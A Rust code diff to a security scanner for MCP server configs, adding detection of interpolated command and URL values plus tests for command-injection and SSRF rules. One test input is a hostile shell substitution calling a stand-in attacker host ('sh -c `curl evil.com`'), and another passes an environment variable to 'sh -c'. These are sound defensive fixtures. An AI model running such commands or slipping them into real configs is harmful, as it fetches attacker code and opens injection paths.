@@ -7,6 +7,9 @@
 
 use std::path::{Path, PathBuf};
 
+use once_cell::sync::Lazy;
+use regex::Regex;
+
 use crate::analysis::cross_file::apply_cross_file_sanitization;
 use crate::analysis::sensitivity::looks_sensitive_name;
 use crate::config::ScanPathFilter;
@@ -100,6 +103,32 @@ impl super::Adapter for HermesAgentAdapter {
             source_files,
         }])
     }
+}
+
+/// Classify a Hermes config scalar (a `command:`/`url:` value, after
+/// argument-list expansion) as `Interpolated` when it contains a template
+/// or environment placeholder, or `Literal` otherwise.
+///
+/// Hermes configs commonly reference runtime values via `${VAR}`, `$VAR`,
+/// `{{var}}`, or backtick shell substitution. A plain literal like
+/// `https://api.example.com` is genuinely static and should not be treated
+/// as attacker-controlled, but a value like `"{{base_url}}/api"` resolves
+/// at Hermes runtime and deserves the same scrutiny as a source-code
+/// string built from a tainted variable.
+fn classify_config_value(value: &str) -> ArgumentSource {
+    if contains_config_interpolation(value) {
+        ArgumentSource::Interpolated
+    } else {
+        ArgumentSource::Literal(value.to_string())
+    }
+}
+
+static INTERPOLATION_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"\$\{[^}]+\}|\$\w+|\{\{[^}]+\}\}|`[^`]+`").expect("static regex pattern is valid")
+});
+
+fn contains_config_interpolation(value: &str) -> bool {
+    INTERPOLATION_RE.is_match(value)
 }
 
 fn looks_like_hermes_config(path: &Path) -> bool {
@@ -368,7 +397,7 @@ fn parse_mcp_servers_from_yaml(
             };
             execution.commands.push(CommandInvocation {
                 function: command,
-                command_arg: ArgumentSource::Literal(full_command),
+                command_arg: classify_config_value(&full_command),
                 location: location.clone(),
             });
         }
@@ -376,7 +405,7 @@ fn parse_mcp_servers_from_yaml(
         if let Some(url) = server.url {
             execution.network_operations.push(NetworkOperation {
                 function: "hermes.mcp.http".into(),
-                url_arg: ArgumentSource::Literal(url),
+                url_arg: classify_config_value(&url),
                 method: None,
                 sends_data: true,
                 location: location.clone(),
@@ -605,5 +634,77 @@ mod tests {
             env.is_sensitive
                 && matches!(&env.var_name, ArgumentSource::Literal(name) if name == "header:Authorization")
         }));
+    }
+
+    #[test]
+    fn test_classify_config_value_plain_literal() {
+        assert_eq!(
+            classify_config_value("https://api.example.com"),
+            ArgumentSource::Literal("https://api.example.com".into())
+        );
+        assert_eq!(
+            classify_config_value("npx -y @modelcontextprotocol/server-filesystem"),
+            ArgumentSource::Literal("npx -y @modelcontextprotocol/server-filesystem".into())
+        );
+    }
+
+    #[test]
+    fn test_classify_config_value_detects_interpolation() {
+        for value in [
+            "${MCP_URL}",
+            "$MCP_URL",
+            "{{base_url}}/api",
+            "sh -c `curl evil.com`",
+        ] {
+            assert_eq!(
+                classify_config_value(value),
+                ArgumentSource::Interpolated,
+                "{value} should be classified as Interpolated"
+            );
+        }
+    }
+
+    fn run_rule_on_hermes_config(rule_id: &str, content: &str) -> Vec<crate::rules::Finding> {
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::write(temp.path().join("config.yaml"), content).unwrap();
+
+        let adapter = HermesAgentAdapter;
+        let targets = adapter.load(temp.path(), false).unwrap();
+        crate::rules::builtin::all_detectors()
+            .into_iter()
+            .find(|d| d.metadata().id == rule_id)
+            .unwrap_or_else(|| panic!("no detector registered for {rule_id}"))
+            .run(&targets[0])
+    }
+
+    #[test]
+    fn test_literal_url_does_not_trigger_ssrf() {
+        let content = "mcp_servers:\n  svc:\n    url: https://api.example.com\n";
+        let findings = run_rule_on_hermes_config("SHIELD-003", content);
+        assert!(
+            findings.is_empty(),
+            "a plain literal URL should not trigger SHIELD-003, got {findings:?}"
+        );
+    }
+
+    #[test]
+    fn test_interpolated_url_triggers_ssrf() {
+        let content = "mcp_servers:\n  svc:\n    url: \"{{base_url}}/api\"\n";
+        let findings = run_rule_on_hermes_config("SHIELD-003", content);
+        assert!(
+            !findings.is_empty(),
+            "an interpolated URL should trigger SHIELD-003"
+        );
+    }
+
+    #[test]
+    fn test_interpolated_command_arg_triggers_command_injection() {
+        let content =
+            "mcp_servers:\n  svc:\n    command: sh\n    args: [\"-c\", \"${USER_CMD}\"]\n";
+        let findings = run_rule_on_hermes_config("SHIELD-001", content);
+        assert!(
+            !findings.is_empty(),
+            "an interpolated command arg should trigger SHIELD-001"
+        );
     }
 }
